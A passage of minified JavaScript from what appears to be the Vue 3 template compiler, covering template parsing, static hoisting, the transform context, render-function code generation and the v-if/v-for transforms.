r===-1?(s=e.source.slice(n),advanceBy(e,e.source.length)):(s=e.source.slice(n,r),advanceBy(e,r+1)),{type:3,content:s,loc:getSelection(e,t)}}function parseElement(e,t){const n=e.inPre,s=e.inVPre,r=last(t),o=parseTag(e,TagType.Start,r),l=e.inPre&&!n,d=e.inVPre&&!s;if(o.isSelfClosing||e.options.isVoidTag(o.tag))return l&&(e.inPre=!1),d&&(e.inVPre=!1),o;t.push(o);const u=e.options.getTextMode(o,r),f=parseChildren(e,u,t);t.pop();{const m=o.props.find(g=>g.type===6&&g.name==="inline-template");if(m&&checkCompatEnabled("COMPILER_INLINE_TEMPLATE",e,m.loc)){const g=getSelection(e,o.loc.end);m.value={type:2,content:g.source,loc:g}}}if(o.children=f,startsWithEndTagOpen(e.source,o.tag))parseTag(e,TagType.End,r);else if(emitError(e,24,0,o.loc.start),e.source.length===0&&o.tag.toLowerCase()==="script"){const m=f[0];m&&startsWith(m.loc.source,"<!--")&&emitError(e,8)}return o.loc=getSelection(e,o.loc.start),l&&(e.inPre=!1),d&&(e.inVPre=!1),o}var TagType=(e=>(e[e.Start=0]="Start",e[e.End=1]="End",e))(TagType||{});const isSpecialTemplateDirective=makeMap("if,else,else-if,for,slot");function parseTag(e,t,n){const s=getCursor(e),r=/^<\/?([a-z][^\t\r\n\f />]*)/i.exec(e.source),o=r[1],l=e.options.getNamespace(o,n);advanceBy(e,r[0].length),advanceSpaces(e);const d=getCursor(e),u=e.source;e.options.isPreTag(o)&&(e.inPre=!0);let f=parseAttributes(e,t);t===0&&!e.inVPre&&f.some(y=>y.type===7&&y.name==="pre")&&(e.inVPre=!0,extend(e,d),e.source=u,f=parseAttributes(e,t).filter(y=>y.name!=="v-pre"));let m=!1;if(e.source.length===0?emitError(e,9):(m=startsWith(e.source,"/>"),t===1&&m&&emitError(e,4),advanceBy(e,m?2:1)),t===1)return;let g=0;return e.inVPre||(o==="slot"?g=2:o==="template"?f.some(y=>y.type===7&&isSpecialTemplateDirective(y.name))&&(g=3):isComponent(o,f,e)&&(g=1)),{type:1,ns:l,tag:o,tagType:g,props:f,isSelfClosing:m,children:[],loc:getSelection(e,s),codegenNode:void 0}}function isComponent(e,t,n){const s=n.options;if(s.isCustomElement(e))return!1;if(e==="component"||/^[A-Z]/.test(e)||isCoreComponent(e)||s.isBuiltInComponent&&s.isBuiltInComponent(e)||s.isNativeTag&&!s.isNativeTag(e))return!0;for(let r=0;r<t.length;r++){const o=t[r];if(o.type===6){if(o.name==="is"&&o.value){if(o.value.content.startsWith("vue:"))return!0;if(checkCompatEnabled("COMPILER_IS_ON_ELEMENT",n,o.loc))return!0}}else{if(o.name==="is")return!0;if(o.name==="bind"&&isStaticArgOf(o.arg,"is")&&checkCompatEnabled("COMPILER_IS_ON_ELEMENT",n,o.loc))return!0}}}function parseAttributes(e,t){const n=[],s=new Set;for(;e.source.length>0&&!startsWith(e.source,">")&&!startsWith(e.source,"/>");){if(startsWith(e.source,"/")){emitError(e,22),advanceBy(e,1),advanceSpaces(e);continue}t===1&&emitError(e,3);const r=parseAttribute(e,s);r.type===6&&r.value&&r.name==="class"&&(r.value.content=r.value.content.replace(/\s+/g," ").trim()),t===0&&n.push(r),/^[^\t\r\n\f />]/.test(e.source)&&emitError(e,15),advanceSpaces(e)}return n}function parseAttribute(e,t){var n;const s=getCursor(e),o=/^[^\t\r\n\f />][^\t\r\n\f />=]*/.exec(e.source)[0];t.has(o)&&emitError(e,2),t.add(o),o[0]==="="&&emitError(e,19);{const u=/["'<]/g;let f;for(;f=u.exec(o);)emitError(e,17,f.index)}advanceBy(e,o.length);let l;/^[\t\r\n\f ]*=/.test(e.source)&&(advanceSpaces(e),advanceBy(e,1),advanceSpaces(e),l=parseAttributeValue(e),l||emitError(e,13));const d=getSelection(e,s);if(!e.inVPre&&/^(v-[A-Za-z0-9-]|:|\.|@|#)/.test(o)){const u=/(?:^v-([a-z0-9-]+))?(?:(?::|^\.|^@|^#)(\[[^\]]+\]|[^\.]+))?(.+)?$/i.exec(o);let f=startsWith(o,"."),m=u[1]||(f||startsWith(o,":")?"bind":startsWith(o,"@")?"on":"slot"),g;if(u[2]){const v=m==="slot",x=o.lastIndexOf(u[2],o.length-(((n=u[3])==null?void 0:n.length)||0)),E=getSelection(e,getNewPosition(e,s,x),getNewPosition(e,s,x+u[2].length+(v&&u[3]||"").length));let S=u[2],w=!0;S.startsWith("[")?(w=!1,S.endsWith("]")?S=S.slice(1,S.length-1):(emitError(e,27),S=S.slice(1))):v&&(S+=u[3]||""),g={type:4,content:S,isStatic:w,constType:w?3:0,loc:E}}if(l&&l.isQuoted){const v=l.loc;v.start.offset++,v.start.column++,v.end=advancePositionWithClone(v.start,l.content),v.source=v.source.slice(1,-1)}const y=u[3]?u[3].slice(1).split("."):[];return f&&y.push("prop"),m==="bind"&&g&&y.includes("sync")&&checkCompatEnabled("COMPILER_V_BIND_SYNC",e,d,g.loc.source)&&(m="model",y.splice(y.indexOf("sync"),1)),{type:7,name:m,exp:l&&{type:4,content:l.content,isStatic:!1,constType:0,loc:l.loc},arg:g,modifiers:y,loc:d}}return!e.inVPre&&startsWith(o,"v-")&&emitError(e,26),{type:6,name:o,value:l&&{type:2,content:l.content,loc:l.loc},loc:d}}function parseAttributeValue(e){const t=getCursor(e);let n;const s=e.source[0],r=s==='"'||s==="'";if(r){advanceBy(e,1);const o=e.source.indexOf(s);o===-1?n=parseTextData(e,e.source.length,4):(n=parseTextData(e,o,4),advanceBy(e,1))}else{const o=/^[^\t\r\n\f >]+/.exec(e.source);if(!o)return;const l=/["'<=`]/g;let d;for(;d=l.exec(o[0]);)emitError(e,18,d.index);n=parseTextData(e,o[0].length,4)}return{content:n,isQuoted:r,loc:getSelection(e,t)}}function parseInterpolation(e,t){const[n,s]=e.options.delimiters,r=e.source.indexOf(s,n.length);if(r===-1){emitError(e,25);return}const o=getCursor(e);advanceBy(e,n.length);const l=getCursor(e),d=getCursor(e),u=r-n.length,f=e.source.slice(0,u),m=parseTextData(e,u,t),g=m.trim(),y=m.indexOf(g);y>0&&advancePositionWithMutation(l,f,y);const v=u-(m.length-g.length-y);return advancePositionWithMutation(d,f,v),advanceBy(e,s.length),{type:5,content:{type:4,isStatic:!1,constType:0,content:g,loc:getSelection(e,l,d)},loc:getSelection(e,o)}}function parseText(e,t){const n=t===3?["]]>"]:["<",e.options.delimiters[0]];let s=e.source.length;for(let l=0;l<n.length;l++){const d=e.source.indexOf(n[l],1);d!==-1&&s>d&&(s=d)}const r=getCursor(e);return{type:2,content:parseTextData(e,s,t),loc:getSelection(e,r)}}function parseTextData(e,t,n){const s=e.source.slice(0,t);return advanceBy(e,t),n===2||n===3||!s.includes("&")?s:e.options.decodeEntities(s,n===4)}function getCursor(e){const{column:t,line:n,offset:s}=e;return{column:t,line:n,offset:s}}function getSelection(e,t,n){return n=n||getCursor(e),{start:t,end:n,source:e.originalSource.slice(t.offset,n.offset)}}function last(e){return e[e.length-1]}function startsWith(e,t){return e.startsWith(t)}function advanceBy(e,t){const{source:n}=e;advancePositionWithMutation(e,n,t),e.source=n.slice(t)}function advanceSpaces(e){const t=/^[\t\r\n\f ]+/.exec(e.source);t&&advanceBy(e,t[0].length)}function getNewPosition(e,t,n){return advancePositionWithClone(t,e.originalSource.slice(t.offset,n),n)}function emitError(e,t,n,s=getCursor(e)){n&&(s.offset+=n,s.column+=n),e.options.onError(createCompilerError(t,{start:s,end:s,source:""}))}function isEnd(e,t,n){const s=e.source;switch(t){case 0:if(startsWith(s,"</")){for(let r=n.length-1;r>=0;--r)if(startsWithEndTagOpen(s,n[r].tag))return!0}break;case 1:case 2:{const r=last(n);if(r&&startsWithEndTagOpen(s,r.tag))return!0;break}case 3:if(startsWith(s,"]]>"))return!0;break}return!s}function startsWithEndTagOpen(e,t){return startsWith(e,"</")&&e.slice(2,2+t.length).toLowerCase()===t.toLowerCase()&&/[\t\r\n\f />]/.test(e[2+t.length]||">")}function hoistStatic(e,t){walk(e,t,isSingleElementRoot(e,e.children[0]))}function isSingleElementRoot(e,t){const{children:n}=e;return n.length===1&&t.type===1&&!isSlotOutlet(t)}function walk(e,t,n=!1){const{children:s}=e,r=s.length;let o=0;for(let l=0;l<s.length;l++){const d=s[l];if(d.type===1&&d.tagType===0){const u=n?0:getConstantType(d,t);if(u>0){if(u>=2){d.codegenNode.patchFlag="-1",d.codegenNode=t.hoist(d.codegenNode),o++;continue}}else{const f=d.codegenNode;if(f.type===13){const m=getPatchFlag(f);if((!m||m===512||m===1)&&getGeneratedPropsConstantType(d,t)>=2){const g=getNodeProps(d);g&&(f.props=t.hoist(g))}f.dynamicProps&&(f.dynamicProps=t.hoist(f.dynamicProps))}}}if(d.type===1){const u=d.tagType===1;u&&t.scopes.vSlot++,walk(d,t),u&&t.scopes.vSlot--}else if(d.type===11)walk(d,t,d.children.length===1);else if(d.type===9)for(let u=0;u<d.branches.length;u++)walk(d.branches[u],t,d.branches[u].children.length===1)}o&&t.transformHoist&&t.transformHoist(s,t,e),o&&o===r&&e.type===1&&e.tagType===0&&e.codegenNode&&e.codegenNode.type===13&&isArray$2(e.codegenNode.children)&&(e.codegenNode.children=t.hoist(createArrayExpression(e.codegenNode.children)))}function getConstantType(e,t){const{constantCache:n}=t;switch(e.type){case 1:if(e.tagType!==0)return 0;const s=n.get(e);if(s!==void 0)return s;const r=e.codegenNode;if(r.type!==13||r.isBlock&&e.tag!=="svg"&&e.tag!=="foreignObject")return 0;if(getPatchFlag(r))return n.set(e,0),0;{let d=3;const u=getGeneratedPropsConstantType(e,t);if(u===0)return n.set(e,0),0;u<d&&(d=u);for(let f=0;f<e.children.length;f++){const m=getConstantType(e.children[f],t);if(m===0)return n.set(e,0),0;m<d&&(d=m)}if(d>1)for(let f=0;f<e.props.length;f++){const m=e.props[f];if(m.type===7&&m.name==="bind"&&m.exp){const g=getConstantType(m.exp,t);if(g===0)return n.set(e,0),0;g<d&&(d=g)}}if(r.isBlock){for(let f=0;f<e.props.length;f++)if(e.props[f].type===7)return n.set(e,0),0;t.removeHelper(OPEN_BLOCK),t.removeHelper(getVNodeBlockHelper(t.inSSR,r.isComponent)),r.isBlock=!1,t.helper(getVNodeHelper(t.inSSR,r.isComponent))}return n.set(e,d),d}case 2:case 3:return 3;case 9:case 11:case 10:return 0;case 5:case 12:return getConstantType(e.content,t);case 4:return e.constType;case 8:let l=3;for(let d=0;d<e.children.length;d++){const u=e.children[d];if(isString$2(u)||isSymbol(u))continue;const f=getConstantType(u,t);if(f===0)return 0;f<l&&(l=f)}return l;default:return 0}}const allowHoistedHelperSet=new Set([NORMALIZE_CLASS,NORMALIZE_STYLE,NORMALIZE_PROPS,GUARD_REACTIVE_PROPS]);function getConstantTypeOfHelperCall(e,t){if(e.type===14&&!isString$2(e.callee)&&allowHoistedHelperSet.has(e.callee)){const n=e.arguments[0];if(n.type===4)return getConstantType(n,t);if(n.type===14)return getConstantTypeOfHelperCall(n,t)}return 0}function getGeneratedPropsConstantType(e,t){let n=3;const s=getNodeProps(e);if(s&&s.type===15){const{properties:r}=s;for(let o=0;o<r.length;o++){const{key:l,value:d}=r[o],u=getConstantType(l,t);if(u===0)return u;u<n&&(n=u);let f;if(d.type===4?f=getConstantType(d,t):d.type===14?f=getConstantTypeOfHelperCall(d,t):f=0,f===0)return f;f<n&&(n=f)}}return n}function getNodeProps(e){const t=e.codegenNode;if(t.type===13)return t.props}function getPatchFlag(e){const t=e.patchFlag;return t?parseInt(t,10):void 0}function createTransformContext(e,{filename:t="",prefixIdentifiers:n=!1,hoistStatic:s=!1,cacheHandlers:r=!1,nodeTransforms:o=[],directiveTransforms:l={},transformHoist:d=null,isBuiltInComponent:u=NOOP,isCustomElement:f=NOOP,expressionPlugins:m=[],scopeId:g=null,slotted:y=!0,ssr:v=!1,inSSR:x=!1,ssrCssVars:E="",bindingMetadata:S=EMPTY_OBJ,inline:w=!1,isTS:k=!1,onError:C=defaultOnError$1,onWarn:R=defaultOnWarn,compatConfig:L}){const O=t.replace(/\?.*$/,"").match(/([^/\\]+)\.\w+$/),I={selfName:O&&capitalize$1(camelize(O[1])),prefixIdentifiers:n,hoistStatic:s,cacheHandlers:r,nodeTransforms:o,directiveTransforms:l,transformHoist:d,isBuiltInComponent:u,isCustomElement:f,expressionPlugins:m,scopeId:g,slotted:y,ssr:v,inSSR:x,ssrCssVars:E,bindingMetadata:S,inline:w,isTS:k,onError:C,onWarn:R,compatConfig:L,root:e,helpers:new Map,components:new Set,directives:new Set,hoists:[],imports:[],constantCache:new Map,temps:0,cached:0,identifiers:Object.create(null),scopes:{vFor:0,vSlot:0,vPre:0,vOnce:0},parent:null,currentNode:e,childIndex:0,inVOnce:!1,helper(A){const j=I.helpers.get(A)||0;return I.helpers.set(A,j+1),A},removeHelper(A){const j=I.helpers.get(A);if(j){const G=j-1;G?I.helpers.set(A,G):I.helpers.delete(A)}},helperString(A){return`_${helperNameMap[I.helper(A)]}`},replaceNode(A){I.parent.children[I.childIndex]=I.currentNode=A},removeNode(A){const j=I.parent.children,G=A?j.indexOf(A):I.currentNode?I.childIndex:-1;!A||A===I.currentNode?(I.currentNode=null,I.onNodeRemoved()):I.childIndex>G&&(I.childIndex--,I.onNodeRemoved()),I.parent.children.splice(G,1)},onNodeRemoved:()=>{},addIdentifiers(A){},removeIdentifiers(A){},hoist(A){isString$2(A)&&(A=createSimpleExpression(A)),I.hoists.push(A);const j=createSimpleExpression(`_hoisted_${I.hoists.length}`,!1,A.loc,2);return j.hoisted=A,j},cache(A,j=!1){return createCacheExpression(I.cached++,A,j)}};return I.filters=new Set,I}function transform$1(e,t){const n=createTransformContext(e,t);traverseNode$1(e,n),t.hoistStatic&&hoistStatic(e,n),t.ssr||createRootCodegen(e,n),e.helpers=new Set([...n.helpers.keys()]),e.components=[...n.components],e.directives=[...n.directives],e.imports=n.imports,e.hoists=n.hoists,e.temps=n.temps,e.cached=n.cached,e.filters=[...n.filters]}function createRootCodegen(e,t){const{helper:n}=t,{children:s}=e;if(s.length===1){const r=s[0];if(isSingleElementRoot(e,r)&&r.codegenNode){const o=r.codegenNode;o.type===13&&convertToBlock(o,t),e.codegenNode=o}else e.codegenNode=r}else if(s.length>1){let r=64;e.codegenNode=createVNodeCall(t,n(FRAGMENT),void 0,e.children,r+"",void 0,void 0,!0,void 0,!1)}}function traverseChildren(e,t){let n=0;const s=()=>{n--};for(;n<e.children.length;n++){const r=e.children[n];isString$2(r)||(t.parent=e,t.childIndex=n,t.onNodeRemoved=s,traverseNode$1(r,t))}}function traverseNode$1(e,t){t.currentNode=e;const{nodeTransforms:n}=t,s=[];for(let o=0;o<n.length;o++){const l=n[o](e,t);if(l&&(isArray$2(l)?s.push(...l):s.push(l)),t.currentNode)e=t.currentNode;else return}switch(e.type){case 3:t.ssr||t.helper(CREATE_COMMENT);break;case 5:t.ssr||t.helper(TO_DISPLAY_STRING);break;case 9:for(let o=0;o<e.branches.length;o++)traverseNode$1(e.branches[o],t);break;case 10:case 11:case 1:case 0:traverseChildren(e,t);break}t.currentNode=e;let r=s.length;for(;r--;)s[r]()}function createStructuralDirectiveTransform(e,t){const n=isString$2(e)?s=>s===e:s=>e.test(s);return(s,r)=>{if(s.type===1){const{props:o}=s;if(s.tagType===3&&o.some(isVSlot))return;const l=[];for(let d=0;d<o.length;d++){const u=o[d];if(u.type===7&&n(u.name)){o.splice(d,1),d--;const f=t(s,u,r);f&&l.push(f)}}return l}}}const PURE_ANNOTATION="/*#__PURE__*/",aliasHelper=e=>`${helperNameMap[e]}: _${helperNameMap[e]}`;function createCodegenContext(e,{mode:t="function",prefixIdentifiers:n=t==="module",sourceMap:s=!1,filename:r="template.vue.html",scopeId:o=null,optimizeImports:l=!1,runtimeGlobalName:d="Vue",runtimeModuleName:u="vue",ssrRuntimeModuleName:f="vue/server-renderer",ssr:m=!1,isTS:g=!1,inSSR:y=!1}){const v={mode:t,prefixIdentifiers:n,sourceMap:s,filename:r,scopeId:o,optimizeImports:l,runtimeGlobalName:d,runtimeModuleName:u,ssrRuntimeModuleName:f,ssr:m,isTS:g,inSSR:y,source:e.loc.source,code:"",column:1,line:1,offset:0,indentLevel:0,pure:!1,map:void 0,helper(E){return`_${helperNameMap[E]}`},push(E,S){v.code+=E},indent(){x(++v.indentLevel)},deindent(E=!1){E?--v.indentLevel:x(--v.indentLevel)},newline(){x(v.indentLevel)}};function x(E){v.push(`
`+"  ".repeat(E))}return v}function generate$1(e,t={}){const n=createCodegenContext(e,t);t.onContextCreated&&t.onContextCreated(n);const{mode:s,push:r,prefixIdentifiers:o,indent:l,deindent:d,newline:u,scopeId:f,ssr:m}=n,g=Array.from(e.helpers),y=g.length>0,v=!o&&s!=="module",x=!1,E=x?createCodegenContext(e,t):n;genFunctionPreamble(e,E);const S=m?"ssrRender":"render",k=(m?["_ctx","_push","_parent","_attrs"]:["_ctx","_cache"]).join(", ");if(r(`function ${S}(${k}) {`),l(),v&&(r("with (_ctx) {"),l(),y&&(r(`const { ${g.map(aliasHelper).join(", ")} } = _Vue`),r(`
`),u())),e.components.length&&(genAssets(e.components,"component",n),(e.directives.length||e.temps>0)&&u()),e.directives.length&&(genAssets(e.directives,"directive",n),e.temps>0&&u()),e.filters&&e.filters.length&&(u(),genAssets(e.filters,"filter",n),u()),e.temps>0){r("let ");for(let C=0;C<e.temps;C++)r(`${C>0?", ":""}_temp${C}`)}return(e.components.length||e.directives.length||e.temps)&&(r(`
`),u()),m||r("return "),e.codegenNode?genNode(e.codegenNode,n):r("null"),v&&(d(),r("}")),d(),r("}"),{ast:e,code:n.code,preamble:x?E.code:"",map:n.map?n.map.toJSON():void 0}}function genFunctionPreamble(e,t){const{ssr:n,prefixIdentifiers:s,push:r,newline:o,runtimeModuleName:l,runtimeGlobalName:d,ssrRuntimeModuleName:u}=t,f=d,m=Array.from(e.helpers);if(m.length>0&&(r(`const _Vue = ${f}
`),e.hoists.length)){const g=[CREATE_VNODE,CREATE_ELEMENT_VNODE,CREATE_COMMENT,CREATE_TEXT,CREATE_STATIC].filter(y=>m.includes(y)).map(aliasHelper).join(", ");r(`const { ${g} } = _Vue
`)}genHoists(e.hoists,t),o(),r("return ")}function genAssets(e,t,{helper:n,push:s,newline:r,isTS:o}){const l=n(t==="filter"?RESOLVE_FILTER:t==="component"?RESOLVE_COMPONENT:RESOLVE_DIRECTIVE);for(let d=0;d<e.length;d++){let u=e[d];const f=u.endsWith("__self");f&&(u=u.slice(0,-6)),s(`const ${toValidAssetId(u,t)} = ${l}(${JSON.stringify(u)}${f?", true":""})${o?"!":""}`),d<e.length-1&&r()}}function genHoists(e,t){if(!e.length)return;t.pure=!0;const{push:n,newline:s,helper:r,scopeId:o,mode:l}=t;s();for(let d=0;d<e.length;d++){const u=e[d];u&&(n(`const _hoisted_${d+1} = `),genNode(u,t),s())}t.pure=!1}function genNodeListAsArray(e,t){const n=e.length>3||!1;t.push("["),n&&t.indent(),genNodeList(e,t,n),n&&t.deindent(),t.push("]")}function genNodeList(e,t,n=!1,s=!0){const{push:r,newline:o}=t;for(let l=0;l<e.length;l++){const d=e[l];isString$2(d)?r(d):isArray$2(d)?genNodeListAsArray(d,t):genNode(d,t),l<e.length-1&&(n?(s&&r(","),o()):s&&r(", "))}}function genNode(e,t){if(isString$2(e)){t.push(e);return}if(isSymbol(e)){t.push(t.helper(e));return}switch(e.type){case 1:case 9:case 11:genNode(e.codegenNode,t);break;case 2:genText(e,t);break;case 4:genExpression(e,t);break;case 5:genInterpolation(e,t);break;case 12:genNode(e.codegenNode,t);break;case 8:genCompoundExpression(e,t);break;case 3:genComment(e,t);break;case 13:genVNodeCall(e,t);break;case 14:genCallExpression(e,t);break;case 15:genObjectExpression(e,t);break;case 17:genArrayExpression(e,t);break;case 18:genFunctionExpression(e,t);break;case 19:genConditionalExpression(e,t);break;case 20:genCacheExpression(e,t);break;case 21:genNodeList(e.body,t,!0,!1);break}}function genText(e,t){t.push(JSON.stringify(e.content),e)}function genExpression(e,t){const{content:n,isStatic:s}=e;t.push(s?JSON.stringify(n):n,e)}function genInterpolation(e,t){const{push:n,helper:s,pure:r}=t;r&&n(PURE_ANNOTATION),n(`${s(TO_DISPLAY_STRING)}(`),genNode(e.content,t),n(")")}function genCompoundExpression(e,t){for(let n=0;n<e.children.length;n++){const s=e.children[n];isString$2(s)?t.push(s):genNode(s,t)}}function genExpressionAsPropertyKey(e,t){const{push:n}=t;if(e.type===8)n("["),genCompoundExpression(e,t),n("]");else if(e.isStatic){const s=isSimpleIdentifier(e.content)?e.content:JSON.stringify(e.content);n(s,e)}else n(`[${e.content}]`,e)}function genComment(e,t){const{push:n,helper:s,pure:r}=t;r&&n(PURE_ANNOTATION),n(`${s(CREATE_COMMENT)}(${JSON.stringify(e.content)})`,e)}function genVNodeCall(e,t){const{push:n,helper:s,pure:r}=t,{tag:o,props:l,children:d,patchFlag:u,dynamicProps:f,directives:m,isBlock:g,disableTracking:y,isComponent:v}=e;m&&n(s(WITH_DIRECTIVES)+"("),g&&n(`(${s(OPEN_BLOCK)}(${y?"true":""}), `),r&&n(PURE_ANNOTATION);const x=g?getVNodeBlockHelper(t.inSSR,v):getVNodeHelper(t.inSSR,v);n(s(x)+"(",e),genNodeList(genNullableArgs([o,l,d,u,f]),t),n(")"),g&&n(")"),m&&(n(", "),genNode(m,t),n(")"))}function genNullableArgs(e){let t=e.length;for(;t--&&e[t]==null;);return e.slice(0,t+1).map(n=>n||"null")}function genCallExpression(e,t){const{push:n,helper:s,pure:r}=t,o=isString$2(e.callee)?e.callee:s(e.callee);r&&n(PURE_ANNOTATION),n(o+"(",e),genNodeList(e.arguments,t),n(")")}function genObjectExpression(e,t){const{push:n,indent:s,deindent:r,newline:o}=t,{properties:l}=e;if(!l.length){n("{}",e);return}const d=l.length>1||!1;n(d?"{":"{ "),d&&s();for(let u=0;u<l.length;u++){const{key:f,value:m}=l[u];genExpressionAsPropertyKey(f,t),n(": "),genNode(m,t),u<l.length-1&&(n(","),o())}d&&r(),n(d?"}":" }")}function genArrayExpression(e,t){genNodeListAsArray(e.elements,t)}function genFunctionExpression(e,t){const{push:n,indent:s,deindent:r}=t,{params:o,returns:l,body:d,newline:u,isSlot:f}=e;f&&n(`_${helperNameMap[WITH_CTX]}(`),n("(",e),isArray$2(o)?genNodeList(o,t):o&&genNode(o,t),n(") => "),(u||d)&&(n("{"),s()),l?(u&&n("return "),isArray$2(l)?genNodeListAsArray(l,t):genNode(l,t)):d&&genNode(d,t),(u||d)&&(r(),n("}")),f&&(e.isNonScopedSlot&&n(", undefined, true"),n(")"))}function genConditionalExpression(e,t){const{test:n,consequent:s,alternate:r,newline:o}=e,{push:l,indent:d,deindent:u,newline:f}=t;if(n.type===4){const g=!isSimpleIdentifier(n.content);g&&l("("),genExpression(n,t),g&&l(")")}else l("("),genNode(n,t),l(")");o&&d(),t.indentLevel++,o||l(" "),l("? "),genNode(s,t),t.indentLevel--,o&&f(),o||l(" "),l(": ");const m=r.type===19;m||t.indentLevel++,genNode(r,t),m||t.indentLevel--,o&&u(!0)}function genCacheExpression(e,t){const{push:n,helper:s,indent:r,deindent:o,newline:l}=t;n(`_cache[${e.index}] || (`),e.isVNode&&(r(),n(`${s(SET_BLOCK_TRACKING)}(-1),`),l()),n(`_cache[${e.index}] = `),genNode(e.value,t),e.isVNode&&(n(","),l(),n(`${s(SET_BLOCK_TRACKING)}(1),`),l(),n(`_cache[${e.index}]`),o()),n(")")}new RegExp("\\b"+"arguments,await,break,case,catch,class,const,continue,debugger,default,delete,do,else,export,extends,finally,for,function,if,import,let,new,return,super,switch,throw,try,var,void,while,with,yield".split(",").join("\\b|\\b")+"\\b");const transformIf=createStructuralDirectiveTransform(/^(if|else|else-if)$/,(e,t,n)=>processIf(e,t,n,(s,r,o)=>{const l=n.parent.children;let d=l.indexOf(s),u=0;for(;d-->=0;){const f=l[d];f&&f.type===9&&(u+=f.branches.length)}return()=>{if(o)s.codegenNode=createCodegenNodeForBranch(r,u,n);else{const f=getParentCondition(s.codegenNode);f.alternate=createCodegenNodeForBranch(r,u+s.branches.length-1,n)}}}));function processIf(e,t,n,s){if(t.name!=="else"&&(!t.exp||!t.exp.content.trim())){const r=t.exp?t.exp.loc:e.loc;n.onError(createCompilerError(28,t.loc)),t.exp=createSimpleExpression("true",!1,r)}if(t.name==="if"){const r=createIfBranch(e,t),o={type:9,loc:e.loc,branches:[r]};if(n.replaceNode(o),s)return s(o,r,!0)}else{const r=n.parent.children;let o=r.indexOf(e);for(;o-->=-1;){const l=r[o];if(l&&l.type===3){n.removeNode(l);continue}if(l&&l.type===2&&!l.content.trim().length){n.removeNode(l);continue}if(l&&l.type===9){t.name==="else-if"&&l.branches[l.branches.length-1].condition===void 0&&n.onError(createCompilerError(30,e.loc)),n.removeNode();const d=createIfBranch(e,t);l.branches.push(d);const u=s&&s(l,d,!1);traverseNode$1(d,n),u&&u(),n.currentNode=null}else n.onError(createCompilerError(30,e.loc));break}}}function createIfBranch(e,t){const n=e.tagType===3;return{type:10,loc:e.loc,condition:t.name==="else"?void 0:t.exp,children:n&&!findDir(e,"for")?e.children:[e],userKey:findProp(e,"key"),isTemplateIf:n}}function createCodegenNodeForBranch(e,t,n){return e.condition?createConditionalExpression(e.condition,createChildrenCodegenNode(e,t,n),createCallExpression(n.helper(CREATE_COMMENT),['""',"true"])):createChildrenCodegenNode(e,t,n)}function createChildrenCodegenNode(e,t,n){const{helper:s}=n,r=createObjectProperty("key",createSimpleExpression(`${t}`,!1,locStub,2)),{children:o}=e,l=o[0];if(o.length!==1||l.type!==1)if(o.length===1&&l.type===11){const u=l.codegenNode;return injectProp(u,r,n),u}else{let u=64;return createVNodeCall(n,s(FRAGMENT),createObjectExpression([r]),o,u+"",void 0,void 0,!0,!1,!1,e.loc)}else{const u=l.codegenNode,f=getMemoedVNodeCall(u);return f.type===13&&convertToBlock(f,n),injectProp(f,r,n),u}}function getParentCondition(e){for(;;)if(e.type===19)if(e.alternate.type===19)e=e.alternate;else return e;else e.type===20&&(e=e.value)}const transformFor=createStructuralDirectiveTransform("for",(e,t,n)=>{const{helper:s,removeHelper:r}=n;return processFor(e,t,n,o=>{const l=createCallExpression(s(RENDER_LIST),[o.source]),d=isTemplateNode(e),u=findDir(e,"memo"),f=findProp(e,"key"),m=f&&(f.type===6?createSimpleExpression(f.value.content,!0):f.exp),g=f?createObjectProperty("key",m):null,y=o.source.type===4&&o.source.constType>0,v=y?64:f?128:256;return o.codegenNode=createVNodeCall(n,s(FRAGMENT),void 0,l,v+"",void 0,void 0,!0,!y,!1,e.loc),()=>{let x;const{children:E}=o,S=E.length!==1||E[0].type!==1,w=isSlotOutlet(e)?e:d&&e.children.length===1&&isSlotOutlet(e.children[0])?e.children[0]:null;if(w?(x=w.codegenNode,d&&g&&injectProp(x,g,n)):S?x=createVNodeCall(n,s(FRAGMENT),g?createObjectExpression([g]):void 0,e.children,"64",void 0,void 0,!0,void 0,!1):(x=E[0].codegenNode,d&&g&&injectProp(x,g,n),x.isBlock!==!y&&(x.isBlock?(r(OPEN_BLOCK),r(getVNodeBlockHelper(n.inSSR,x.isComponent))):r(getVNodeHelper(n.inSSR,x.isComponent))),x.isBlock=!y,x.isBlock?(s(OPEN_BLOCK),s(getVNodeBlockHelper(n.inSSR,x.isComponent))):s(getVNodeHelper(n.inSSR,x.isComponent))),u){const k=createFunctionExpression(createForLoopParams(o.parseResult,[createSimpleExpression("_cached")]));k.body=createBlockStatement([createCompoundExpression(["const _memo = (",u.exp,")"]),createCompoundExpression(["if (_cached",...m?[" && _cached.key === ",m]:[],` && ${n.helperString(IS_MEMO_SAME)}(_cached, _memo)) return _cached`]),createCompoundExpression(["const _item = ",x]),createSimpleExpression("_item.memo = _memo"),createSimpleExpression("return _item")]),l.arguments.push(k,createSimpleExpression("_cache"),createSimpleExpression(String(n.cached++)))}else l.arguments.push(createFunctionExpression(createForLoopParams(o.parseResult),x,!0))}})});function processFor(e,t,n,s){if(!t.exp){n.onError(createCompilerError(31,t.loc));return}const r=parseForExpression(t.exp);if(!r){n.onError(createCompilerError(32,t.loc));return}const{addIdentifiers:o,removeIdentifiers:l,scopes:d}=n,{source:u,value:f,key:m,index:g}=r,y={type:11,loc:t.loc,source:u,valueAlias:f,keyAlias:m,objectIndexAlias:g,parseResult:r,children:isTemplateNode(e)?e.children:[e]};n.replaceNode(y),d.vFor++;const v=s&&s(y);return()=>{d.vFor--,v&&v()}}const forAliasRE=/([\s\S]*?)\s+(?:in|of)\s+([\s\S]*)/,forIteratorRE=/,([^,\}\]]*)(?:,([^,\}\]]*))?$/,stripParensRE=/^\(|\)$/g;function parseForExpression(e,t){const n=e.loc,s=e.content,r=s.match(forAliasRE);if(!r)return;const[,o,l]=r,d={source:createAliasExpression(n,l.trim(),s.indexOf(l,o.length)),value:void 0,key:void 0,index:void 0};let u=o.trim().replace(stripParensRE,"").trim();const f=o.indexOf(u),m=u.match(forIteratorRE);if(m){u=u.replace(forIteratorRE,"").trim();const g=m[1].trim();let y;if(g&&(y=s.indexOf(g,f+u.length),d.key=createAliasExpression(n,g,y)),m[2]){const v=m[2].trim();v&&(d.index=createAliasExpression(n,v,s.indexOf(v,d.key?y+g.length:f+u.length)))}}return u&&(d.value=createAliasExpression(n,u,f)),d}function createAliasExpression(e,t,n){return createSimpleExpression(t,!1,getInnerRange(e,n,t.length))}function createForLoopParams({value:e,key:t,index:n},s=[]){return createParamsList([e,t,n,...s])}function createParamsList(e){let t=e.length;for(;t--&&!e[t];);return e.slice(0,t+1).map((n,s)=>n||createSimpleExpression("_".repeat(s+1),!1))}const 